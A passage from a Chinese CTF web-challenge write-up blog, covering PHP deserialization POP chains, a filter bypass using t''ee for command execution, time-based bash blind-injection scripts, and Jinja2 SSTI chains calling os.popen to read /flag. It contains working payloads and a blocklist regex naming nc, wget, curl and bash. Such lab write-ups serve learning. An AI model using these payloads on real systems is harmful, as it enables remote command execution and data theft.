方法中，我们构造了一个命令行字符串，然后通过执行漏洞执行了系统命令。</span><br></pre></td></tr></table></figure>

<p>得到payload:</p>
<p>pop&#x3D;O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A8%3A%22readfile%22%3Bs%3A3%3A%22var%22%3Bs%3A5%3A%22%2Fflag%22%3B%7D%7D%7D%7D%7D%7D</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa964f3ae.png" alt="image-20240201202421115"></p>
<p>其实我觉得我应该重学一下反序列化漏洞 忘得太多了 太不熟练了</p>
<p>过年那周重学一下吧</p>
<h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p><code>tee</code>命令用于从标准输入读取数据，并将其写入一个或多个文件 tee的作用是把查询到的根目录写入到当前网页下的某文件 再次访问该文件即可得到被打印的根目录</p>
<p><code>tee</code>通常后面会跟着要写入的文件名</p>
<p>script a：<code>script</code> 是一个Unix&#x2F;Linux命令，用于记录终端会话。当你运行 <code>script</code> 命令时，它会开始记录你在终端中的所有活动，直到你停止它。<code>a</code> 是 <code>script</code> 命令的一个选项，表示将输出追加到一个文件中，而不是覆盖它。如果文件不存在，它会被创建；如果文件已经存在，新的输出会被追加到文件的末尾。</p>
<p>Shell是一个通用术语，指的是用户与操作系统内核之间的交互界面。它是一个命令解释器，允许用户通过键盘输入命令来与操作系统进行交互。Shell提供了一种执行命令、控制进程、文件操作等的途径，可以是交互式的也可以是脚本式的。</p>
<p>Bash是一种Unix Shell，是Bourne Again SHell的缩写。它是Bourne Shell的增强版本，在功能上扩展了Bourne Shell，同时兼容POSIX标准。Bash支持命令行编辑、命令历史、条件测试、循环结构等高级特性，使得脚本编写更加方便。</p>
<p><strong>简单来说，Shell是一个广义的概念，Bash是Shell的一种具体实现。</strong></p>
<p>所以 用ls &#x2F; | t’’ee b的方法进行查看</p>
<p>也可以用ls &#x2F; |script a  跟ls &#x2F; | t’’ee b作用是一样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls / | t&#x27;&#x27;ee b&quot;</span>;<span class="comment">//”ls / |script a“</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//调用两次</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果O:7:”minipop”:2:{s:4:”code”;s:14:”ls &#x2F; | t’’ee b”;s:13:”qwejaskdjnlka”;O:7:”minipop”:2:{s:4:”code”;s:14:”ls &#x2F; | t’’ee b”;s:13:”qwejaskdjnlka”;N;}}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa967a651.png" alt="image-20240201211829175"></p>
<p>访问文件b  访问a</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa950dcce.png" alt="image-20240201211918373"></p>
<p>发现flag所在文件</p>
<p>直接cat &#x2F;flag_is_h3eeere</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|t&#x27;&#x27;ee b&quot;</span>;<span class="comment">//&quot; cat /flag_is_h3eeere|script a&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"> </span><br><span class="line"><span class="variable">$b</span>= <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>(); <span class="comment">//调用两次</span></span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka=<span class="variable">$a</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>结果</p>
<p>O:7:”minipop”:2:{s:4:”code”;s:28:”cat &#x2F;flag_is_h3eeere|t’’ee b”;s:13:”qwejaskdjnlka”;O:7:”minipop”:2:{s:4:”code”;s:28:”cat &#x2F;flag_is_h3eeere|t’’ee b”;s:13:”qwejaskdjnlka”;N;}}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9747e25.png" alt="image-20240201212214441"></p>
<p>再查看文件b或a</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9443648.png" alt="image-20240201212238787"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa975c099.png" alt="image-20240201212705906"></p>
<p>官方说这考点本来应该是bash盲注 没太看懂</p>
<p>Bash盲注是一种针对Bash shell的注入攻击，攻击者尝试利用Bash的某些特性来执行恶意命令或获取敏感信息。</p>
<p>在Bash中，用户输入的命令会被解析和执行。攻击者可能会尝试利用Bash的输入验证不严格、命令替换等特性，注入恶意代码，导致意外的行为或泄露敏感信息</p>
<p>这道题脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://bcdad1a5-6014-4594-a8b5-c4c03f581147.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        <span class="comment">#ascii码表</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            k=<span class="built_in">chr</span>(k)</span><br><span class="line">            payload =<span class="string">f&quot;if [ `cat /flag_is_h3eeere | awk NR==<span class="subst">&#123;i&#125;</span> | cut -c <span class="subst">&#123;j&#125;</span>` == &#x27;<span class="subst">&#123;k&#125;</span>&#x27; ];then sleep 2;fi&quot;</span></span><br><span class="line">            length=<span class="built_in">len</span>(payload)</span><br><span class="line">            payload2 =&#123;</span><br><span class="line">                <span class="string">&quot;payload&quot;</span>: <span class="string">&#x27;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;N;s:13:&quot;qwejaskdjnlka&quot;;O:7:&quot;minipop&quot;:2:&#123;&#123;s:4:&quot;code&quot;;s:&#123;0&#125;:&quot;&#123;1&#125;&quot;;s:13:&quot;qwejaskdjnlka&quot;;N;&#125;&#125;&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(length,payload)</span><br><span class="line">            &#125;</span><br><span class="line">            t1=time.time()</span><br><span class="line">            r=requests.post(url=url,data=payload2)</span><br><span class="line">            t2=time.time()</span><br><span class="line">            <span class="keyword">if</span> t2-t1 &gt;<span class="number">1.5</span>:</span><br><span class="line">                result+=k</span><br><span class="line">                <span class="built_in">print</span>(result)</span><br><span class="line">    result += <span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9597b14.png" alt="image-20240201215218834"></p>
<p>其他base盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote <span class="keyword">as</span> urlen</span><br><span class="line">url  = <span class="string">&#x27;http://2505541e-7bbc-4055-b36b-00c8454b850e.challenge.ctf.show/?F=`$F%20`;&#x27;</span></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line">		<span class="comment"># payload = &quot;if [ `ls  | grep &#x27;flag&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;.format(i,char) #flag.php</span></span><br><span class="line">		payload = <span class="string">&quot;if [ `cat flag.php | grep &#x27;flag&#x27; |cut -c&#123;&#125;` = &#x27;&#123;&#125;&#x27; ];then sleep 5;fi&quot;</span>.<span class="built_in">format</span>(i,char)</span><br><span class="line">		<span class="comment"># data = &#123;&#x27;cmd&#x27;:payload&#125;</span></span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			start = <span class="built_in">int</span>(t.time())</span><br><span class="line">			r = requests.get(url+payload)</span><br><span class="line">			<span class="comment"># r = requests.post(url, data=data)</span></span><br><span class="line">			end = <span class="built_in">int</span>(t.time()) - start</span><br><span class="line">			<span class="keyword">if</span> end &gt;= <span class="number">3</span>:		</span><br><span class="line">				result += char</span><br><span class="line">				<span class="built_in">print</span>(<span class="string">&quot;Flag: &quot;</span>+result)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			<span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实对base盲注还是不太明白 QAQ</p>
<p>解释：</p>
<p>Bash盲注<br>截取比较<br>参考 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/kiko2014551511/p/11531558.html">https://www.cnblogs.com/kiko2014551511/p/11531558.html</a></p>
<p>cat &#x2F;flag | cut -c (截取第几位)</p>
<p>${string:start:length} 从字符串左边开始计数</p>
<p>string为要截取的字符串，start是起始位置（从左边开始，从0开始计数），length是要截取的长度(省略的话表示直到字符串的末尾)</p>
<p>${string:0-start:length} 从右边开始计数<br>同从左边开始计数相比，这种格式仅仅多了0-，这是固定的写法，专门用来标识从字符串右边开始计数</p>
<p>注意点：</p>
<p>从左边开始计数时，起始数字是0；<br>从右边开始计数时，起始数字是1<br>不管从哪边计数，截取方向都是从左到右</p>
<p>延时<br>sleep 5 </p>
<p>只找到这一篇解释 懵逼</p>
<h3 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa949f492.png" alt="image-20240201225109579"></p>
<p>f12 在网络中发现奇怪的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa97ecc4e.png" alt="image-20240201225202549"></p>
<p>发现secr3tofpop   可能是个文件</p>
<p>查一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa93dfd63.png" alt="image-20240201225256182"></p>
<p>让我们get传一个name</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9549f52.png" alt="image-20240201225407225"></p>
<p>传admin 回显admin</p>
<p>可能是ssti</p>
<p>传<code>&#123;%print(7*7)%&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa96efcd3.png" alt="image-20240201225538869"></p>
<p>回显49   是ssti</p>
<p>查看config 看看key 没有，那考点应该不是爆破 查看一下子类</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9809428.png" alt="image-20240201232337950"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()%&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa962497c.png" alt="image-20240201232510988"></p>
<p>找os模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(132)|attr(&quot;__in&quot;+&quot;it__&quot;)|attr(&quot;__globals__&quot;)%&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa96314b5.png" alt="image-20240201233511794"></p>
<p>找到eval</p>
<p>不能使用system函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())</span><br><span class="line"></span><br><span class="line">所以发现flag之后也是一样的改为__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read() </span><br></pre></td></tr></table></figure>

<p>然后对它进行chr编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(132)|attr(&quot;__in&quot;+&quot;it__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)%&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa98a71c2.png" alt="image-20240201234041082"></p>
<p>flag{44f974fa-5970-49dd-aba8-4b9bdf9c5bdf}    </p>
<p>也可以用get_flashed_message()</p>
<p><code>get_flashed_messages()</code> 是一个在 Flask web 框架中用于处理 flash 消息的函数。Flash 消息是一种在用户进行表单提交后显示的临时消息，通常用于通知用户关于表单提交的结果。</p>
<p>例如，如果你有一个表单，用户提交后你可能想要显示一个消息告诉他们表单已成功提交或出现了一些错误。Flash 消息就是用来实现这个目的的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% print(get_flashed_messages.__globals__.os[&quot;pop&quot;+&quot;en&quot;](&quot;cat /flag&quot;).read()) %&#125;</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa944ca18.png" alt="image-20240201234319631"></p>
<h3 id="OtenkiGirl"><a href="#OtenkiGirl" class="headerlink" title="OtenkiGirl"></a>OtenkiGirl</h3><p>JavaScript 原型链污染</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9b28770.png" alt="image-20240202225439118"></p>
<p>还有这个网站的源码</p>
<p>有回显</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9d2432e.png" alt="image-20240202225622528"></p>
<p>bp抓包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6642328723e81.png" alt="image-20240202230258106"></p>
<p>发现多了一个timestamp 时间戳</p>
<p>时间戳（Timestamp）通常表示某一时刻或事件发生的确切时间，这个时间通常以某种固定的格式被记录下来，以便于后续的处理、比较或排序。</p>
<p>一共发了五个包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa9a669c8.png" alt="image-20240202230849584"></p>
<p>其中向info发了时间戳</p>
<p>进一步尝试发现 不管发什么都会向info发时间戳</p>
<p>所以看看源码 info到底是干什么的</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/13/6641fa954c2c0.png" alt="image-20240202233059552"></p>
<p>先看看基础的app.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> env = <span class="variable language_">global</span>.<span class="property">env</span> = (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> || <span class="string">&quot;production&quot;</span>).<span class="title function_">trim</span>();</span><br><span class="line"><span class="keyword">const</span> isEnvDev = <span class="variable language_">global</span>.<span class="property">isEnvDev</span> = env === <span class="string">&quot;development&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">devOnly</span> = (<span class="params">fn</span>) =&gt; isEnvDev ? (<span class="keyword">typeof</span> fn === <span class="string">&quot;function&quot;</span> ? <span class="title function_">fn</span>() : fn) : <span class="literal">undefined</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;./config&quot;</span>), <span class="variable constant_">DEFAULT_CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;./config.default&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="variable constant_">CONFIG</span>.<span class="property">server_port</span> || <span class="variable constant_">DEFAULT_CONFIG</span>.<span class="property">server_port</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;koa-bodyparser&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="built_in">require</span>(<span class="string">&#x27;koa-static&#x27;</span>)(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;./static&#x27;</span>)));</span><br><span class="line"><span class="title function_">devOnly</span>(<span class="function"><span class="params">_</span> =&gt;</span> <span class="built_in">require</span>(<span class="string">&quot;./webpack.proxies.dev&quot;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">p</span> =&gt;</span> app.<span class="title function_">use</span>(p)));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">bodyParser</span>(&#123;</span><br><span class="line">    <span class="attr">onerror</span>: <span class="keyword">function</span> (<span class="params">err, ctx</span>) &#123;</span><br><span class="line">        <span class="comment">// If the json is invalid, the body will be set to &#123;&#125;. That means, the request json would be seen as empty.</span></span><br><span class="line">        <span class="keyword">if</span> (err.<span class="property">status</span> === <span class="number">400</span> &amp;&amp; err.<span class="property">name</span> === <span class="string">&#x27;SyntaxError&#x27;</span> &amp;&amp; ctx.<span class="property">request</span>.<span class="property">type</span> === <span class="string">&#x27;application/json&#x27;</span>) &#123;</span><br><span class="line">            ctx.<span class="property">request</span>.<span class="property">body</span> = &#123;&#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> err;</span><br><span 